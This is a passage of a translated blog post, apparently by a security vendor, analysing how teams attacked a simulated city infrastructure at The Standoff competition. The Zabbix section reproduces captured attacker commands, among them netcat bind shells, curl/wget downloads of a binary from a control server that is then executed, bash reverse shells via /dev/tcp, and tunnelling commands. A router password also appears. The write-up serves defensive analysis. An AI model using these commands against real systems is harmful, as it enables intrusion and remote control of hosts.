src="https://habrastorage.org/webt/9f/x3/_1/9fx3_1jvkl4uqssgz68wrf6ldbm.png"><br><br>  vitalik checks the availability of the mail server and starts the server management console after an interactive login. <br><br><img src="https://habrastorage.org/webt/zm/li/2g/zmli2globqjnbfeliqdjxkyd2mm.png"><br><img src="https://habrastorage.org/webt/mm/je/go/mmjegoxoerj7gci7kw2lvhkz6gy.png"><br><br>  Finding nothing worthwhile, he drags his tools and heavy artillery to the Win2008R2-DC host ‚Äî numerous powershell scripts and the BloodHound framework, which is a popular exploration tool in Active Directory networks, appear on the domain controller.  To access the BloodHound web interface, the participant had to disable protected mode in IE, which was also discovered by SIEM. <br><br><img src="https://habrastorage.org/webt/u3/ib/u0/u3ibu0j98wyjouwgd_tfuzugafq.png"><br><br>  BloodHound activity on the network did not pass by PT NAD.  One of the features of the tool was to scan the hosts on the network for active connections.  Such traffic to the SRVSVC service is detected by one of the PT NAD signatures and indicates exploration occurring within the network: <br><br><img src="https://habrastorage.org/webt/zw/j7/9a/zwj79aykwoy3aa3ygbtlifaptzw.png"><br><br>  About one o'clock in the morning, the attackers, having previously created a shadow copy of the disk with the help of the vssadmin utility, dragged the ntds.dit database, which contains all domain accounts.  Having successfully carried out this attack, the attackers completely seize the domain, gaining the hash of the special account ‚Äúkrbtgt‚Äù.  Having this account allows you to create and use a so-called.  Golden Ticket - Kerberos ticket for unlimited access to resources in a domain, accessing servers on behalf of any existing and even nonexistent users, and any actions in a domain.  Using the Golden Ticket is quite difficult to detect with protective devices, but it is much easier to detect the compromise of the krbtgt and ntds.dit nodes. <br><br><img src="https://habrastorage.org/webt/is/xb/ko/isxbkotm_hpkchj8wfg6jmb9nqu.png"><br><img src="https://habrastorage.org/webt/oo/k7/69/ook7697a_0mftn0ynebutsrzwwa.png"><br><img src="https://habrastorage.org/webt/tp/dp/-v/tpdp-vl4mvsfelj_wlxzlnqo5ro.png"><br><br>  The team is gradually moving from the domain research to the research of the ACS TP network that it has opened.  After dragging on the machines of SPUTNIK employees - YLAVRENTIEV.sputnik.phd and EPONOMAREV.sputnik.phd Nmap scanners, 172.20.xx networks were scanned. The participants used <a href="">nmap_performance.reg</a> to change the TCP / IP parameters of the windows stack and accelerate the scanning of the ACS of the network. <br><br><img src="https://habrastorage.org/webt/oo/fm/7g/oofm7gzqfy5ze8f1oowfc3lxs-o.png"><br><img src="https://habrastorage.org/webt/2b/pf/pe/2bpfpextzlgkpkcimasndiajhg0.png"><br><br>  Connections to the hosts in the ACS of the network through tunnels on the hosts of the SPUTNIK domain speak for themselves.  A description of what hackers did in the industrial network can be found in the video of our colleagues on <a href="https://youtu.be/yitJyYoJVWE%3Ft%3D242">YouTube</a> . <br><br>  Among other achievements of the attackers, other tunnels, ssh sessions, creative breakthroughs after a sleepless night on the first day of the competition, and of course installed game miners that mine the DDOS Coin currency were noticed. <br><br><h2>  ZABBIX (100.64.100.161) </h2><br>  He settled in the DMZ office # 1 and proudly played his role, until around noon he was hacked by an unidentified team. <br><br><img src="https://habrastorage.org/webt/4t/6o/6z/4t6o6zrdsxgxqtuvbwqmucyekjy.png"><br><br>  Admin's credentials were easy to pick up and the team used the built-in zabbix functionality to unlimitedly expand monitoring capabilities using custom scripts. <br><br><img src="https://habrastorage.org/webt/rb/_w/xo/rb_wxomfxjzu5-9lx7au5u3lll4.png"><br><br>  You can use any linux commands in the scripts, which was used by the teams of the participants, creating shells and Socks-proxies. <br><br><pre> <code class="bash hljs"><span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=/bin/nc -e /bin/sh -lp 5432 2&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=/bin/ping -c 3 {HOST.CONN} 2&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ls /bin/ <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=/bin/nc -e /bin/sh -lp 5432 2&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=/bin/nc -e /bin/sh -lp 5432 2&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ping 8.8.8.8 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ping 8.8.8.8; netstat -tulpn <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ping -n 4 8.8.8.8; netstat -tulpn <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ls /tmp/phd <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=netstat -tulpn <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=wget http://195.16.61.232:8888/x86_elf -O /tmp; ls /tmp <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ls /tmp <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=curl http://195.16.61.232:8888/x86_elf --output /tmp/tmp.bin;ls /tmp <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ping -c 4 195.16.61.232 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=touch /tmp/<span class="hljs-built_in"><span class="hljs-built_in">test</span></span>;ls /tmp/ <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=<span class="hljs-built_in"><span class="hljs-built_in">pwd</span></span> <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=whoami <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ls /var/www/html <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=<span class="hljs-built_in"><span class="hljs-built_in">which</span></span> nc <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=curl http://195.16.61.230/PHD/ --output /tmp/tmp.bin; ls /tmp <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=bash -i &gt;&amp; /dev/tcp/195.16.61.232/8080 0&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=chmod u+x /tmp/tmp.bin;/tmp/tmp.bin <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=bash -i &gt;&amp; /dev/tcp/195.16.61.232/195 &gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=bash -i &gt;&amp; /dev/tcp/195.16.61.232/1950 0&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=bash -i &gt;&amp; /dev/tcp/195.16.61.232/8080 0&gt;&amp;1</code> </pre> <br>  The team attempted to load the module from the control server 195.16.61.232, but without success: <br><br><img src="https://habrastorage.org/webt/le/d6/t4/led6t46tphox4hnvieokwotovo4.png"><br><br>  Then, after a bit of environmental intelligence, I installed the remote bash shell using standard linux tools with the same server, sending the packets directly to / dev / tcp /. <br><br>  No less interesting was the content of the traffic between the team and the shell, which was transmitted in the clear and did not pass by the PT NAD sensors. <br><br><pre> <code class="bash hljs">bash-4.2$ /tmp/gost -L socks4a://:1080 &amp; bash-4.2$ gost -L=:54321 -F=10.100.50.48:3389 bash-4.2$ /tmp/gost -L socks4a://:1080 &amp; bash-4.2$ nmap bash: nmap: <span class="hljs-built_in"><span class="hljs-built_in">command</span></span> not found bash-4.2$ ifconfig bash-4.2$ ping 172.30.240.106 bash-4.2$ wget https://gist.githubusercontent.com/sh1n0b1/e2e1a5f63fbec3706123/raw/1bd5f119a7f1e2d4c9328d78686ae79b4e1642f7/linuxprivchecker.py bash-4.2$ python linuxprivchecker.py bash-4.2$ uname -a bash-4.2$ <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> /etc/cron.daily: bash-4.2$ ./gost -L=tcp://:33899/10.100.50.39:3389 bash-4.2$ ./gost -L=tcp://:4455/10.100.50.39:445 &amp; bash-4.2$ ./gost -L=tcp://:1139/10.100.50.39:139 &amp; bash-4.2$ ./gost -L=tcp://:12345/10.100.60.55:3389 &amp; bash-4.2$ ./gost -L=tcp://:12347/10.100.60.5:445 &amp; bash-4.2$ ./gost -L=tcp://:12348/10.100.60.15:445 &amp; bash-4.2$ ./gost -L=tcp://:12349/10.100.50.100:445 &amp; bash-4.2$ ./gost -L=tcp://:12350/10.100.80.28:445 &amp; bash-4.2$ ./gost -L=tcp://:12351/10.100.80.23:445 &amp; bash-4.2$ ./gost -L=tcp://:12352/10.100.80.30:445 &amp; bash-4.2$ ./gost -L=tcp://:12353/10.100.80.32:445 &amp; bash-4.2$ ./gost -L=tcp://:12354/10.100.80.26:445 &amp; bash-4.2$ ./gost -L=tcp://:12355/10.100.80.5:445 &amp; bash-4.2$ ./gost -L=tcp://:12356/10.100.80.9:445 &amp; bash-4.2$ ./gost -L=tcp://:12357/10.100.80.23:445 &amp; bash-4.2$ ./gost -L=socks5://:1081 &amp;</code> </pre><br>  As we can see, the ZABBIX server was mainly used as a bridgehead for the exploration of subnets of office # 1: 10.100.50.0/24 (Users), 10.100.60.0/24 (Servers) and 10.100.80.0/24 (SecurityTeam). <br><br><h2>  Multiserver (100.64.100.167) </h2><br>  Multiserver is another Linux host in the DMZ office # 1 with a couple of HTTP servers and a MySQL database onboard.  Although the multi-server was intensively scanned, there were only a few successful attacks.  The host contained a 2017 vulnerability of SambaCry, found following the vulnerabilities of MS17-010, and the teams tried to use it.  The PT NAD filter allows you to localize their attempts on the timeline: <br><br><img src="https://habrastorage.org/webt/ve/sl/eg/veslegx-lzcod0zrikbkknbtxbg.png"><br><br>  The load in one of the attempts of command # 3 was the executable library DTECJtAf.so.  And judging by the name of the library, team members used the is_known_pipename module from the Metasploit Framework.  Proof: <br><br><img src="https://habrastorage.org/webt/c1/5h/ar/c15harpx4hz5ocakhlp8gfq3-q4.png"><br><br>  During the confrontation, the experts were assisted by PT MultiScanner, who checked all the files passing over the network, noticed by PT NAD.  After a couple of moments, he passes the verdict of the DTECJtAf.so that has flown over the network: Linux / SmbPayload.C <br><br><img src="https://habrastorage.org/webt/2w/xt/su/2wxtsub8m8u3kkr16dat4nrvk4m.png"><br><br>  Judging by the absence of further network interactions between the server and team # 3, the exploit did not bring success.  However, almost at the same time, we see an active SSH session from team # 4.  By the volume of traffic transmitted, we can judge that the attackers used the server in full. <br><br><img src="https://habrastorage.org/webt/s4/bf/ns/s4bfnsifpckisravk3n-nrc-ena.png"><br><br>  Generally speaking, the first successful SSH login from a user administrator from team # 4 happened around 15:20 of the 1st day of the competition: <br><br><img src="https://habrastorage.org/webt/a5/n-/hk/a5n-hkf4xvwasfati_pi-7x2boe.png"><br><br>  Like any decent attacker, the login is followed by privilege checking and host intelligence: <br><br><img src="https://habrastorage.org/webt/bp/zg/82/bpzg820wnmpyq6s4yrhslo27j4m.png"><br><img src="https://habrastorage.org/webt/hh/vx/7f/hhvx7ftfkizbqpwgdvfiontho-g.png"><br><img src="https://habrastorage.org/webt/37/or/nk/37ornkrlvhslrbgqiqrz2lrdyws.png"><br><img src="https://habrastorage.org/webt/jx/cz/fh/jxczfht677gxcxv8zavm-ngngu0.png"><br><img src="https://habrastorage.org/webt/vg/mo/ji/vgmoji-qysdos0gykutljqu-svc.png"><br><br>  And beyond: <br><br><img src="https://habrastorage.org/webt/pn/em/dv/pnemdvcvvnsospf71fayabgznf0.png"><br><img src="https://habrastorage.org/webt/a0/ke/qk/a0keqkukwkssbwt3kjplim5muhg.png"><br><img src="https://habrastorage.org/webt/4s/pb/ga/4spbgaprasyzcv2sbu78xjjl3t8.png"><br><img src="https://habrastorage.org/webt/g2/yx/of/g2yxofrflehddk-g7pffs-fzlw4.png"><br><br>  We easily carry out the attribution of an attacker on the basis of language: <br><br><img src="https://habrastorage.org/webt/zs/e6/xh/zse6xhfmkaibmxyptu4cdhabc6i.png"><br><br>  The multiserver did not receive the proper configuration and it is not known for certain what other attempts the team made.  Judging by the available logs, this host, as well as other hosts in the DMZ office # 1, served as a starting point for researching the internal infrastructure of the office. <br><br><h2>  Misc </h2><br>  Other hosts also became the focus of the teams.  For example, the participants were curious about the Mikrotik router at 100.64.100.237 in the DMZ network of Office # 1.  Around 2 am on the second day of the confrontation, there was a successful login to the console of the router via Telnet with a pair of ‚Äúadmin: VxPvRxX74e8xrbia77hsi7WKm‚Äù.  The firmware version of the device was 6.38.4 - exactly the version on which the famous exploit Chimay Red Stack Clash for Mikrotik was tested, which allowed to execute any code on the device, and, in particular, to pull out the passwords of users on the router.  A vulnerability was discovered by PT NAD. <br><br>  But then, in the dinner area, the team that first occupied the router decided to close the hole with a simple firmware update and monopolize access: <br><br><img src="https://habrastorage.org/webt/p-/kj/-m/p-kj-mpfwkryznwmnwcvppojmk0.png"><br><br>  This is one of the few examples when a team of participants closes a hole in the system so that other teams cannot capture this host. <br><br>  PT MultiScanner discovered a curious event: <br><br><img src="https://habrastorage.org/webt/fn/vg/hm/fnvghm_xf8wqwb6y0ygw7obra_m.jpeg"><br><br>  For access to the bank, teams could use the bank client available on the site.  The site is located in the banking network under the supervision of a team of defenders and they <a href="https://www.offensive-security.com/metasploit-unleashed/backdooring-exe-files/">prodiljeni</a> client using the framework Metasploit and replaced them with the original.  By the luck of the defenders, the protroaned client was downloaded by several teams, as we see in the screenshot of PT MultiScanner above.  There were no successful connections, but the case is worth mentioning, since such scenarios take place in normal life - the attackers trojan programs on official sites or replace updates to carry out attacks on clients. <br><br><h2>  Miners </h2><br>  Another innovation in The Standoff was the appearance of game miners.  According to legend, the teams could use the captured servers as miners, which brought them extra points.  Instead of traditional cryptocurrencies, they mined DDoS Coin - the currency equivalent of the effort spent on a DDoS attack of any server.  The data from the TLS 1.2 handhelds served as Proof-of-Work, and the more the miner performed the TLS handhelds with the target server, the higher was his probability of finding a new unit and receiving his reward from the organizer of the DDoS attack. <br><br>  The client was written in the Go language and could work on both Windows and Linux.  The idea was used for the first time and, although not all teams managed to apply it, attempts to launch it were noticed on many gaming infrastructure servers: <br><br><img src="https://habrastorage.org/webt/ea/sb/lf/easblf9r9rzmlqwyyxp56olu_r0.png"><br><br>  Attempting to launch a miner on a Joomla site (100.64.154.147) <br><br><img src="https://habrastorage.org/webt/_w/j0/um/_wj0umbbybcwaaw_t52vbpcl8v0.png"><br><br>  Running the miner from the infrastructure SPUTNIK (10.106.60.0/24) <br><br><img src="https://habrastorage.org/webt/t-/9g/vd/t-9gvdd4vgnokiwbs1jwn5uheau.png"><br><br>  As part of the game, teams could get a cryptocurrency and exchange it for game points.  Half of the teams managed to use the previously captured servers for the extraction of blocks.  Also in the game logic there was an exchange component - with a sharp change in the amount of currency extracted, its exchange rate decreased.  Thus, it was possible to carry out speculative operations and earn points without performing basic tasks.  But since this idea was not previously used on such games, the teams could not use it properly and this did not significantly affect the course of the game. <br><br>  In terms of the number of namnennyh blocks, the Kazakhstani team of the CARKA, which was the first to launch miners on the gaming infrastructure, broke out.  Here we were able to move away from the network numbers of the teams to their names due to the fact that their identifiers included information about the block and were taken into account when calculating them.  In general, the idea showed itself well and for sure it can be seen on the next The Standoff. <br><br><h2>  Instead of output </h2><br>  On the past The Standoff was hot - 12 teams actively explored and hacked the infrastructure of the city.  Our products allowed us to "spy" how exactly the participants of the game acted, what tactics and tools they chose and what became their goal.  We witnessed how they interacted with the domain infrastructure of the office, starting with infecting one machine and ending with capturing the entire domain and moving on to the next network of automated process control systems.  During an event like The Standoff, the products had a huge load: MaxPatrol SIEM handled 20,000 EPS, and PT NAD processed more than 3 terabytes of network traffic in both days, not to mention the network infrastructure itself: routers, switches and firewalls. <br><br>  Such a compromise of virtual offices could have happened with real ones without proper means of protection and control.  As a rule, this leads to the leakage of valuable data such as correspondence, financial data and personal data of employees / users. <br><br>  Among the endless scans, brutes and attempts to exploit all sorts of vulnerabilities, the products helped to determine exactly how the game infrastructure servers were hacked.  They defined successful attacks and such traces of successful compromise as web shells, remote consoles, tunnels and logins to hosts.  All this helps the experts to make products better. <br><br><img src="https://habrastorage.org/webt/aw/mk/24/awmk245o6p1ousad7r_aqj_kcni.png"><br><br>  In this screenshot of statistics on VPN connections of teams during the game, you can see how internationally this The Standoff was: VPN connections were established with servers in the States, Kazakhstan, the Netherlands and half of Europe!  By the way, there were no teams from the States or Europe at The Standoff, but one team was present from Kazakhstan. </div><p>Source: <a href="https://habr.com/ru/post/418335/">https://habr.com/ru/post/418335/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../418325/index.html">Technical Director Qiwi namainil 500,000 bitcoins, that is 2.4% of the theoretically possible amount</a></li>
<li><a href="../418327/index.html">Shoemakers with boots: which smartphones experts choose for themselves</a></li>
<li><a href="../418329/index.html">Organization of safe testing in production. Part 2</a></li>
<li><a href="../418331/index.html">Masters of servers and networks - with a holiday</a></li>
<li><a href="../418333/index.html">Uber robotic vehicles return to the roads, but people will drive them</a></li>
<li><a href="../418337/index.html">Hot, summer DataGrip 2018.2</a></li>
<li><a href="../418339/index.html">"Manual" manipulator</a></li>
<li><a href="../418341/index.html">Happy sys admin! Postcard with meaning</a></li>
<li><a href="../418345/index.html">Documenting information exchange formats is easy and simple.</a></li>
<li><a href="../418347/index.html">As I wrote the standard C ++ 11 library or why the boost is so scary. Chapter 4.3</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>